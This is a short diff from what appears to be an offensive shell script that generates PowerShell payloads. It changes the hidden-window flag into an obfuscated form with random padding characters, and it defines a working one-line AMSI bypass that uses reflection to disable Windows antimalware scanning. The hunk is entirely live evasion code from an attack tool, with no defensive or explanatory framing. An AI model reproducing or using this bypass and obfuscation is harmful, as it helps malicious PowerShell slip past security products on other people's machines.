@@ -620,7 +620,7 @@ space=$(shuf -er -n3  {A..Z} {a..z} | tr -d '\n')
 #Check if Windows
 if [[ $3 == "w" ]]
 then 
-    win="-W Hidden"
+    win="-W%${space}%Hidden"
     at="@"
     #"Mini-AMSI-bypass". Not a full bypass, but maybe just enough to get other stuff up and running. Can be commented out and changed of course 
     AMSIb="(([Ref].Assembly.GetTypes()|?{\$_-clike'*si*s'}).GetFields(2*20)|?{\$_-clike'*Ini*'}).SetValue(\$$placeh,\$true);"
